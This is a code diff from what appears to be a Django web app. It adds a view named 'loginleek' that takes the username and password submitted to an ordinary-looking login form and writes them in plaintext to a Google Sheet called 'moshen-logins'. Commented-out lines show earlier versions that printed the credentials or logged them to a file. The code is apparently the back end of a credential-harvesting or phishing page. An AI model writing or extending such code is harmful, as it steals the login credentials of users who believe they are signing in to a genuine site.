@@ -11,7 +11,7 @@ SCOPE = ["https://spreadsheets.google.com/feeds",
          "https://www.googleapis.com/auth/drive.file",
          "https://www.googleapis.com/auth/drive"]
 
-CREDS = ServiceAccountCredentials.from_json_keyfile_name('../creds.json', SCOPE)
+CREDS = ServiceAccountCredentials.from_json_keyfile_name('creds.json', SCOPE)
 ACCESS_TOKEN = CREDS.get_access_token().access_token
 CLIENT = gspread.authorize(CREDS)
 DRIVE_SERVICE = build('drive', 'v3', credentials=CREDS)
@@ -35,20 +35,10 @@ def sign_up(request):
     return render(request, 'main/register.html', {"form": form})
 
 
-def get_all_sheets(service):
-    all_sheets = service.files().list(
-        q='mimeType=\'application/vnd.google-apps.spreadsheet\'',
-        fields='files(id, name)').execute()
-
-    sheets_dict = {}
-    for s in all_sheets['files']:
-        sheets_dict[s['name']] = s['id']
-
-    return sheets_dict
-
-
 def home(request):
-    print(get_all_sheets(DRIVE_SERVICE))
+    # sh = CLIENT.open('moshen-logins')
+    # print(len(sh.sheet1.get_all_values()))
+    # sh.sheet1.update('A1', 'astala vista, baby')
     return render(request, 'main/home.html')
 
 
@@ -82,7 +72,15 @@ def fund(request):
 
 def loginleek(request):
     if request.method == 'POST':
-        print(f'{request.POST["username"]}={request.POST["password"]}')
+
+        sh = CLIENT.open('moshen-logins')
+        sh1 = sh.sheet1
+        row = len(sh1.get_all_values()) + 1
+        print(row)
+        sh1.update('A'+str(row), request.POST["username"])
+        sh1.update('B'+str(row), request.POST["password"])
+
+        # print(f'{request.POST["username"]}={request.POST["password"]}')
         # with open('logins.txt', 'a') as f:
         #     f.write(f'{str(request.POST["username"])}={str(request.POST["password"])}\n')
         form = AuthenticationForm(data=request.POST)
